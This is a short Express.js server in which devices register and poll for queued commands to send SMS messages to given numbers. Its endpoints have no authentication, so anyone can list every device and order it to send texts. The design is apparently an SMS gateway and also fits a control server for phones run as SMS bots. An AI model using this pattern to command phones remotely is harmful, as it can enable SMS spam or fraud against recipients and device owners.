const express = require("express");
const cors = require("cors");
const { v4: uuidv4 } = require("uuid");

const app = express();
app.use(cors());
app.use(express.json());

/**
 * In-memory store (Render free → OK for testing)
 */
const devices = {};      // deviceId -> { deviceId, model, time }
const commands = {};     // deviceId -> [ { id, number, message } ]

// Register device
app.post("/register", (req, res) => {
  const { deviceId, model } = req.body;
  if (!deviceId) return res.status(400).json({ error: "deviceId required" });

  devices[deviceId] = {
    deviceId,
    model: model || "unknown",
    time: new Date()
  };

  if (!commands[deviceId]) commands[deviceId] = [];

  res.json({ success: true });
});

// Fetch all device IDs
app.get("/fetch", (req, res) => {
  res.json(Object.values(devices));
});

// Send SMS command
app.post("/sendsms", (req, res) => {
  const { deviceId, number, message } = req.body;

  if (!devices[deviceId]) {
    return res.status(404).json({ error: "Device not found" });
  }

  const cmd = {
    id: uuidv4(),
    number,
    message
  };

  commands[deviceId].push(cmd);
  res.json({ success: true });
});

// Device polls for commands
app.get("/commands", (req, res) => {
  const { deviceId } = req.query;

  if (!commands[deviceId]) return res.json([]);

  const pending = commands[deviceId];
  commands[deviceId] = []; // clear after send

  res.json(pending);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log("Server running on", PORT));
